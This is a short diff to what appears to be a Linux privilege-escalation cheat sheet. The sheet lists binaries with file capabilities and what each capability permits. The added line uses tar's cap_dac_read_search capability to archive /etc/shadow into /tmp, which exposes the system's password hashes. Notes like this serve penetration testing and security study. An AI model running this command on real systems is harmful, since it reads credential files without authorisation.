@@ -126,6 +126,8 @@ getcap -r / 2>/dev/null
 #/usr/bin/systemd-detect-virt - cap_dac_override and cap_sys_ptrace - bypass file rw perms and attach/manipulate processes
 
 #/bin/tar = cap_dac_read_search+ep - cap_dac_read_search+ep - can read any file
+/bin/tar -cf /tmp/shadow.tar /etc/shadow
+
 
 
 
